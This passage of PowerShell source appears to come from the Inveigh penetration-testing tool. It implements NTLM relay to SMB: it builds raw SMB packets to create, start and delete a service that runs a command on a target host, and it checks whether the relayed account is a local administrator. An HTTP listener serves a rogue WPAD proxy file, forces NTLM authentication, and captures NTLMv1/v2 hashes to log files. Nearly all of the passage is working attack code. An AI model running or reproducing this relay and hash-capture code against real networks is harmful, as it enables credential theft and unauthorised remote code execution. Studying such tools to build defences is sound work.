                        + (0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + (0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + $SMB_relay_command_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x09)
                }

                7 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }

                
                8 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x34)`
                        + (0x00,0x00,0x00,0x34,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x13,0x00)`
                        + $SMB_context_handler`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                }
                
                9 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                10 { 
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $inveigh.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x2c)`
                        + (0x00,0x00,0x00,0x2c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x02,0x00)`
                        + $SMB_context_handler
                }
                11 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
            }
            
            $SMB_relay_execute_stream.write($SMB_relay_execute_send, 0, $SMB_relay_execute_send.length)
            $SMB_relay_execute_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_execute_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_execute_stopwatch = [diagnostics.stopwatch]::StartNew()
                
                while(!$SMB_relay_execute_stream.DataAvailable)
                {
                    if($SMB_relay_execute_stopwatch.elapsed -ge $SMB_relay_execute_timeout)
                    {
                        $inveigh.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")])
                        $SMB_relay_failed = $true
                        break SMB_relay_execute_loop
                    }
                }
            }
            
            if ($k -eq 5) 
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]

                if(([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '00-00-00-00') -and ([System.BitConverter]::ToString($SMB_context_handler) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00'))
                {
                    $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")])
                }
                elseif([System.BitConverter]::ToString($SMB_relay_execute_bytes[108..111]) -eq '05-00-00-00')
                {
                    $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")])
                    $inveigh.SMBRelay_failed_list += "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget"
                    $SMB_relay_failed = $true
                }
                else
                {
                    $SMB_relay_failed = $true
                }

            }
            elseif (($k -eq 7) -or ($k -eq 9) -or ($k -eq 11))
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)

                switch($k)
                {
                    7 {
                        $SMB_context_handler = $SMB_relay_execute_bytes[92..111]
                        $SMB_relay_execute_error_message = "Service creation fault context mismatch"
                    }
                    11 {
                        $SMB_relay_execute_error_message = "Service start fault context mismatch"
                    }
                    13 {
                        $SMB_relay_execute_error_message = "Service deletion fault context mismatch"
                    }
                }
                
                if([System.BitConverter]::ToString($SMB_context_handler[0..3]) -ne '00-00-00-00')
                {
                    $SMB_relay_failed = $true
                }

                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq '1a-00-00-1c')
                {
                    $inveigh.console_queue.add("$SMB_relay_execute_error_message service on $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $SMB_relay_execute_error on $SMBRelayTarget")])
                    $SMB_relay_failed = $true
                }
            }        
            else
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)    
            }
            
            if((!$SMB_relay_failed) -and ($k -eq 7))
            {
                $inveigh.console_queue.add("SMB relay service $SMB_service created on $SMBRelayTarget")
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay service $SMB_service created on $SMBRelayTarget")])
            }
            elseif((!$SMB_relay_failed) -and ($k -eq 9))
            {
                $inveigh.console_queue.add("SMB relay command likely executed on $SMBRelayTarget")
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay command likely executed on $SMBRelayTarget")])
            
                if($SMBRelayAutoDisable -eq 'y')
                {
                    $inveigh.SMB_relay = $false
                    $inveigh.console_queue.add("SMB relay auto disabled due to success")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay auto disabled due to success")])
                }
            }
            elseif((!$SMB_relay_failed) -and ($k -eq 11))
            {
                $inveigh.console_queue.add("SMB relay service $SMB_service deleted on $SMBRelayTarget")
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay service $SMB_service deleted on $SMBRelayTarget")])
                }   
            
            [Byte[]]$SMB_relay_execute_ReadAndRequest = (0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                + $inveigh.process_ID_bytes`
                + $SMB_user_ID`
                + $SMB_multiplex_ID`
                + (0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00)
            
            if($SMB_relay_failed)
            {
                $inveigh.console_queue.add("SMB relay failed on $SMBRelayTarget")
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay failed on $SMBRelayTarget")])
                BREAK SMB_relay_execute_loop
            }

            $k++
        }
        
        $inveigh.SMB_relay_active_step = 0
        
        $SMB_relay_socket.Close()
        
    }
}

# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
$HTTP_scriptblock = 
{ 
    param ($SMBRelayTarget,$SMBRelayCommand,$SMBRelayUsernames,$SMBRelayAutoDisable,$SMBRelayNetworkTimeout,$MachineAccounts,$WPADAuth)

    Function NTLMChallengeBase64
    {

        $HTTP_timestamp = Get-Date
        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()
        $HTTP_timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($HTTP_timestamp))
        $HTTP_timestamp = $HTTP_timestamp.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}

        if($Inveigh.challenge)
        {
            $HTTP_challenge = $Inveigh.challenge
            $HTTP_challenge_bytes = $Inveigh.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        }
        else
        {
            $HTTP_challenge_bytes = [String](1..8 | % {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''
            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(" ") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        }

        $inveigh.HTTP_challenge_queue.Add($inveigh.request.RemoteEndpoint.Address.IPAddressToString + $inveigh.request.RemoteEndpoint.Port + ',' + $HTTP_challenge) |Out-Null

        [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
            + $HTTP_challenge_bytes`
            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00)`
            + (0x02,0x00,0x06,0x00,0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00)`
            + (0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,0x00,0x68,0x00,0x6f,0x00)`
            + (0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00)`
            + (0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00)`
            + $HTTP_timestamp`
            + (0x00,0x00,0x00,0x00,0x0a,0x0a)

        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        $NTLM = 'NTLM ' + $NTLM_challenge_base64
        $NTLM_challenge = $HTTP_challenge

        Return $NTLM

    }
    
    while ($inveigh.relay_running)
    {
        #$inveigh.context = $inveigh.HTTP_listener.GetContext() 
        #$inveigh.request = $inveigh.context.Request
        #$inveigh.response = $inveigh.context.Response
        $inveigh.message = ''
        
        while(!$inveigh.HTTP_listener.Pending())
        {
            $inveigh.console_queue.add("waiting")
            Start-Sleep -s 1
        }

        if(!$HTTP_listener.Connected)
        {
            $HTTP_listener = $inveigh.HTTP_listener.AcceptTcpClient() # will block here until connection 
            
	        $HTTP_stream = $HTTP_listener.GetStream() 
            $inveigh.console_queue.add("accept")
        }
        $TCP_request_bytes = New-Object System.Byte[] 1024
        #while (($1 $HTTP_stream.Read($HTTP_request_bytes2,0,$HTTP_request_bytes2.Length)) -ne 0){
			#$EncodedText = New-Object System.Text.ASCIIEncoding
         #   $data = $EncodedText.GetString($bytes,0, $i)			
            #$HTTP_request_bytes += $HTTP_request_bytes2
			#Write-Output $data
		#}


        #$buffer = $HTTP_stream.Read($HTTP_request_bytes, 0, $HTTP_request_bytes.Length)
        Start-Sleep -s 1
        while ($HTTP_stream.DataAvailable)
        {
            $inveigh.console_queue.add("new")
            $HTTP_stream.Read($TCP_request_bytes, 0, $TCP_request_bytes.Length)
        }
        
        #$HTTP_stream.Flush()

        $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)

        #$inveigh.console_queue.add($HTTP_request)
        
        #$inveigh.console_queue.add($HTTP_request.IndexOf("-20-"))
        #$inveigh.console_queue.add($HTTP_request.Substring($HTTP_request.IndexOf("-20-") + 1).IndexOf("-20-"))
        if($TCP_request -like "47-45-54-20-2f*")
        {
        $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)

        $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
        $inveigh.request_RawUrl = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
        #$inveigh.console_queue.add($inveigh.request_RawUrl)
        #$inveigh.console_queue.add($TCP_request)
        }

        if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
        {
            
            $HTTP_authorization_header = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
            $HTTP_authorization_header = $HTTP_authorization_header.Substring(0,$HTTP_authorization_header.IndexOf("-0D-0A-"))
            $HTTP_authorization_header = $HTTP_authorization_header.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
            $authentication_header = New-Object System.String ($HTTP_authorization_header,0,$HTTP_authorization_header.Length)
        }
        else
        {
            $authentication_header =  ''
        }
        #$inveigh.console_queue.add($authentication_header)

        #$HTTP_authorization_header_begin_index = $HTTP_request.IndexOf("7574686F72697A6174696F6E3A20")
        #$HTTP_authorization_header = $HTTP_request.SubString($HTTP_authorization_header_begin_index,800)
        #$HTTP_authorization_header_end_index = $HTTP_authorization_header.IndexOf("0D0A")
        
        
        
        <#
        if($inveigh.request.IsSecureConnection)
        {
            $HTTP_type = "HTTPS"
        }
        else
        {
            $HTTP_type = "HTTP"
        }
        #>
        $HTTP_type = "HTTP"

        $inveigh.console_queue.add($inveigh.request_RawUrl)

        $HTTP_request_type = ""
        
        if ($inveigh.request_RawUrl -match '/wpad.dat')
        {
            $inveigh.response_StatusCode = (0x32,0x30,0x30)
            $HTTP_response_phrase = (0x4f,0x4b)
            $HTTP_WPAD_response = (0x46,0x69,0x6e,0x64,0x50,0x72,0x6f,0x78,0x79,0x46,0x6f,0x72,0x55,0x52,0x4c,0x28)`
                + (0x75,0x72,0x6c,0x2c,0x68,0x6f,0x73,0x74,0x29,0x7b,0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,0x73,0x28,0x68,0x6f)`
                + (0x73,0x74,0x2c,0x20,0x22,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49)`
                + (0x52,0x45,0x43,0x54,0x22,0x3b,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x50,0x52,0x4f,0x58,0x59,0x20,0x31,0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31)`
                + (0x3a,0x38,0x30,0x22,0x3b,0x7d)

            $NTLM = ''
            $HTTP_request_type = "WPAD"
        }
        elseif ($inveigh.request_RawUrl -like '/GETHASHES*')
        {
            $inveigh.response_StatusCode = (0x34,0x30,0x31)
            $HTTP_response_phrase = (0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64)
            $NTLM = 'NTLM'
            $HTTP_request_type = "NTLM"
        }
        else
        {
            $inveigh.response_StatusCode = (0x33,0x30,0x32)
            $HTTP_location = (0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x70,0x72,0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x45,0x78,0x70,0x69,0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x2f,0x47,0x45,0x54,0x48,0x41,0x53,0x48,0x45,0x53,0x34,0x36,0x32,0x35,0x32,0x38,0x0d,0x0a)
            $HTTP_response_phrase = (0x4f,0x4b)
            $NTLM = ''
            $HTTP_request_type = "Redirect"
        }

        
        $inveigh.console_queue.add($HTTP_request_type)
        
            
        #[string]$authentication_header = $inveigh.request.headers.getvalues('Authorization')

        #$inveigh.response_StatusCode = (0x32,0x30,0x30)
        #$HTTP_response_phrase = (0x4f,0x4b)

        #$test2 = [System.BitConverter]::ToString($HTTP_request_bytes)
        #        $inveigh.console_queue.add($test2)
        
        if($authentication_header.startswith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $inveigh.response_StatusCode = (0x34,0x30,0x31)
            $HTTP_response_phrase = (0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64)
            
            if ($HTTP_request_bytes[8] -eq 1)
            {
                $inveigh.console_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $inveigh.request_RawUrl + " received from " + $HTTP_listener.Client.RemoteEndpoint.Address)
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $inveigh.request_RawUrl + " received from " + $HTTP_listener.Client.RemoteEndpoint.Address)])

                if(($inveigh.SMB_relay) -and ($inveigh.SMB_relay_active_step -eq 0)) # -and ($inveigh.request.RemoteEndpoint.Address -ne $SMBRelayTarget))
                {
                    $inveigh.SMB_relay_active_step = 1
                    $inveigh.console_queue.add("$HTTP_type to SMB relay triggered by " + $HTTP_listener.Client.RemoteEndpoint.Address + " at $(Get-Date -format 's')")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by " + $HTTP_listener.Client.RemoteEndpoint.Address)])
                    $inveigh.console_queue.add("Grabbing challenge for relay from $SMBRelayTarget")
                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $SMBRelayTarget)])
                    $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                    $SMB_relay_socket.connect($SMBRelayTarget,"445")
                    
                    if(!$SMB_relay_socket.connected)
                    {
                        $inveigh.console_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")])
                        $inveigh.SMB_relay_active_step = 0
                    }
                    
                    if($inveigh.SMB_relay_active_step -eq 1)
                    {
                        $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes
                        $inveigh.SMB_relay_active_step = 2
                        $SMB_relay_bytes = $SMB_relay_bytes[2..$SMB_relay_bytes.length]
                        $SMB_user_ID = $SMB_relay_bytes[34..33]
                        $SMB_relay_NTLMSSP = [System.BitConverter]::ToString($SMB_relay_bytes)
                        $SMB_relay_NTLMSSP = $SMB_relay_NTLMSSP -replace "-",""
                        $SMB_relay_NTLMSSP_index = $SMB_relay_NTLMSSP.IndexOf("4E544C4D53535000")
                        $SMB_relay_NTLMSSP_bytes_index = $SMB_relay_NTLMSSP_index / 2
                        $SMB_domain_length = DataLength ($SMB_relay_NTLMSSP_bytes_index + 12) $SMB_relay_bytes
                        $SMB_domain_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 12)..($SMB_relay_NTLMSSP_bytes_index + 19)]
                        $SMB_target_length = DataLength ($SMB_relay_NTLMSSP_bytes_index + 40) $SMB_relay_bytes
                        $SMB_target_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 40)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]
                        $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
                        $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
                    
                        [byte[]] $HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00)`
                            + $SMB_domain_length_offset_bytes`
                            + (0x05,0x82,0x89,0xa2)`
                            + $SMB_relay_NTLM_challenge`
                            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                            + $SMB_target_length_offset_bytes`
                            + $SMB_relay_target_details
                    
                        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                        $NTLM = 'NTLM ' + $NTLM_challenge_base64
                        $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
                        $inveigh.HTTP_challenge_queue.Add($HTTP_listener.Client.RemoteEndpoint.Address.IPAddressToString + $HTTP_listener.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge)
                        $inveigh.console_queue.add("Received challenge $NTLM_challenge for relay from $SMBRelayTarget")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $SMBRelayTarget")])
                        $inveigh.console_queue.add("Providing challenge $NTLM_challenge for relay to " + $HTTP_listener.Client.RemoteEndpoint.Address)
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to " + $HTTP_listener.Client.RemoteEndpoint.Address)])
                        $inveigh.SMB_relay_active_step = 3
                    }
                    else
                    {
                        $NTLM = NTLMChallengeBase64
                    }
                }
                else
                {
                     $NTLM = NTLMChallengeBase64
                }
                
                $inveigh.response_StatusCode = (0x34,0x30,0x31)
                $HTTP_response_phrase = (0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64)
                
            }
            elseif ($HTTP_request_bytes[8] -eq 3)
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_offset = $HTTP_request_bytes[24]
                $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
                
                [string]$NTLM_challenge = $inveigh.HTTP_challenge_queue -like $HTTP_listener.Client.RemoteEndpoint.Address.IPAddressToString + $HTTP_listener.Client.RemoteEndpoint.Port + '*'
                $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(","))+1)
                       
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                        
                $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
        
                if($HTTP_NTLM_length -eq 24) # NTLMv1
                {
                    $NTLM_type = "NTLMv1"
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(48,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                    if((($NTLM_challenge -ne '') -and ($NTLM_response -ne '')) -and (($MachineAccounts -eq 'y') -or (($MachineAccounts -eq 'n') -and (-not $HTTP_NTLM_user_string.EndsWith('$')))))
                    {    
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv1_file_queue.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv1_list.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response captured from " + $inveigh.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("$HTTP_type NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file)
                        }                   
                    }
                    
                    if (($inveigh.IP_capture_list -notcontains $HTTP_listener.Client.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.spoofer_repeat))
                    {
                        $inveigh.IP_capture_list += $HTTP_listener.Client.RemoteEndpoint.Address
                    }
                }
                else # NTLMv2
                {   
                    $NTLM_type = "NTLMv2"           
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(32,':')
                    $inveigh.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                    
                    if((($NTLM_challenge -ne '') -and ($NTLM_response -ne '')) -and (($MachineAccounts -eq 'y') -or (($MachineAccounts -eq 'n') -and (-not $HTTP_NTLM_user_string.EndsWith('$')))))
                    {
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $HTTP_listener.Client.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")])
                        $inveigh.NTLMv2_file_queue.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.NTLMv2_list.add($inveigh.HTTP_NTLM_hash)
                        $inveigh.console_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from " + $HTTP_listener.Client.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $inveigh.HTTP_NTLM_hash)
                        
                        if($inveigh.file_output)
                        {
                            $inveigh.console_queue.add("$HTTP_type NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file)
                        }
                        
                    }
                    
                    if (($inveigh.IP_capture_list -notcontains $HTTP_listener.Client.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.spoofer_repeat))
                    {
                        $inveigh.IP_capture_list += $HTTP_listener.Client.RemoteEndpoint.Address
                    }
                }
                
                $inveigh.response_StatusCode = (0x32,0x30,0x30)
                $HTTP_response_phrase = (0x4f,0x4b)
                $NTLM_challenge = ''
                
                if (($inveigh.SMB_relay) -and ($inveigh.SMB_relay_active_step -eq 3))
                {
